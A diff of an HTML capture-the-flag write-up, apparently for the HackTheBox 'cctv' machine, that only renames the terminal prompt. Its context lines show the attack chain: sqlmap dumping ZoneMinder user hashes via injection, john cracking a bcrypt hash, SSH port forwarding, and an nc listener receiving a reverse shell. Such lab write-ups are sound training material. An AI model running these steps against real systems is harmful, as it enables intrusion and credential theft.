@@ -272,7 +272,7 @@
               class="w-10 h-10 rounded-sm border-2 border-gray-700 object-cover transition-transform duration-300 transform group-hover:scale-105"
               style="animation: border-breathe 4s ease-in-out infinite;" />
             <span class="text-white text-lg sm:text-xl md:text-2xl lg:text-3xl font-semibold tracking-wide">
-              root@epangelinan: cd
+              root@pangelinan: cd
               <span class="inline-block ml-2" style="animation: flicker 1.6s steps(2, end) infinite;">_</span>
             </span>
           </a>
@@ -499,7 +499,7 @@
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# nmap -sS -oN nmap_scan.txt 10.129.7.141                     </span></span></code></pre></div></div>
   </div>
 </div>
@@ -583,7 +583,7 @@ Other than that, the rest of the options didn&rsquo;t seem like attack vectors. 
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# sqlmap -u <span style="color:#e6db74">&#39;http://cctv.htb/zm/index.php?view=request&amp;request=event&amp;action=removetag&amp;tid=1&#39;</span> <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span>--cookie <span style="color:#e6db74">&#34;ZMSESSID=5hbje44ebg6n3n0s61f0bhbr6a&#34;</span> <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span>-D zm -T Users --dump</span></span></code></pre></div></div>
@@ -602,7 +602,7 @@ Other than that, the rest of the options didn&rsquo;t seem like attack vectors. 
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/output/cctv.htb/dump/zm<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/output/cctv.htb/dump/zm<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# cat Users.csv
 </span></span><span style="display:flex;"><span>Username,Password
 </span></span><span style="display:flex;"><span>superadmin,$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
@@ -625,7 +625,7 @@ The format of the hashes were bcrypt, with a cost factor of 10. I attempted to c
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# john hash.txt --format<span style="color:#f92672">=</span>bcrypt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt
 </span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
 </span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>bcrypt <span style="color:#f92672">[</span>Blowfish 32/64 X3<span style="color:#f92672">])</span>
@@ -658,7 +658,7 @@ The format of the hashes were bcrypt, with a cost factor of 10. I attempted to c
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# ssh mark@cctv.htb
 </span></span><span style="display:flex;"><span>mark@cctv.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
 </span></span><span style="display:flex;"><span>Welcome to Ubuntu 24.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 6.8.0-111-generic x86_64<span style="color:#f92672">)</span>
@@ -747,7 +747,7 @@ I went back to my attacker machine&rsquo;s terminal and used SSH to tunnel a con
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# ssh -L 9999:127.0.0.1:8765 mark@cctv.htb</span></span></code></pre></div></div>
   </div>
 </div>
@@ -861,7 +861,7 @@ The payload used in order to get a reverse shell was:</p>
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# nc -lvnp <span style="color:#ae81ff">4444</span>  
 </span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...</span></span></code></pre></div></div>
   </div>
@@ -882,7 +882,7 @@ After that, the rest was history.</p>
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# nc -lvnp <span style="color:#ae81ff">4444</span>  
 </span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
 </span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.16.192<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.9.47<span style="color:#f92672">]</span> <span style="color:#ae81ff">40052</span>
